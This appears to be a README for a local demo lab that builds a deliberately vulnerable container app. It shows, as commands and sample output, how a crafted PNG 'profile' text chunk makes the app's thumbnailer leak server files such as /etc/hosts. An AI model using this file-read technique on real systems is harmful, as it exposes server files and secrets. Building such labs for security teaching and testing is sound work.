## Container exploit playground

WIP

### Prerequisites on local machine:
* [Docker Desktop](https://docs.docker.com/get-docker/) (or similar)
* [pngcrush](https://pmt.sourceforge.io/pngcrush/)
* [Python 3](https://www.python.org/)
* [curl](https://github.com/curl/curl)
* _Optional but helpful for troubleshooting:_ [exiv2](https://exiv2.org/) 

### Steps to run (build from the vulnerable-app folder):
* Build the image: `docker build -t poc .`
* Run the vulnerable app: `docker run --rm -p 5001:5000 poc`
* Use the exploit.py script to trigger the exploit (examples use the k8s.png file in this repo, you can use your own if you want):
  * Encode a png file with the file you want to cat: `./exploit.py encode k8s.png /etc/hosts`
  * Upload the encoded file to the vulnerable app: `./exploit.py upload localhost:5001 encoded-k8s.png`
  * Decode the returned file: `./exploit.py decode localhost:5001 result.png`

#### Example output:
```shell
$ ./exploit.py encode k8s.png /etc/hosts
Encoding /etc/hosts into k8s.png as encoded-k8s.png ...
File encoded as encoded-k8s.png

$ ./exploit.py upload encoded-k8s.png localhost:5001
Sending encoded-k8s.png to localhost:5001...
Thumbnailed image received as result.png

$ ./exploit.py decode result.png 
Decoding content from /Users/eric/work/git/container-goof/result.png...

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3      72641ba685c6

```

Manual Steps:
1. Build and run the vulnerable app as above
2. Encode the file you want to cat into the image: `pngcrush -text a "profile" "/etc/hosts" pngin.png pngout.png`
3. Upload the file to the webapp at http://localhost:5001/ (thumbnailed image will auto-download)
4. Decode the image file via `docker run --rm -it -v /full/path/to/resized-image.png:/result.png node identify -verbose /result.png`